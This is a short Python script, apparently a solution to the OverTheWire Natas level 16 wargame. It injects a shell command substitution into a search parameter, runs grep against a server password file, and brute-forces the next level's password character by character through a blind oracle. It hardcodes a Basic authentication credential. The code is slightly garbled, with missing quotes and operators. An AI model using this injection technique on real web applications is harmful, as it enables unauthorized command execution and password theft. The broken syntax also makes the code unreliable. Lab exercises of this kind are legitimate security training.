import requests

CHARACTERS = ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
found_characters = 

for i in range(1, 35):
    
    for char in CHARACTERS:

        payload = f$(grep ^{found_characters   char} /etc/natas_webpass/natas17)anything&submit=Search
        url = fhttp://natas16.natas.labs.overthewire.org?needle={payload}

        response = requests.get(url, headers={Authorization: "Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg== "})

        if banything not in response.content:
            found_characters  = char
            print(found_characters)
            print( "<<--FOnd Characters-->> ", char)
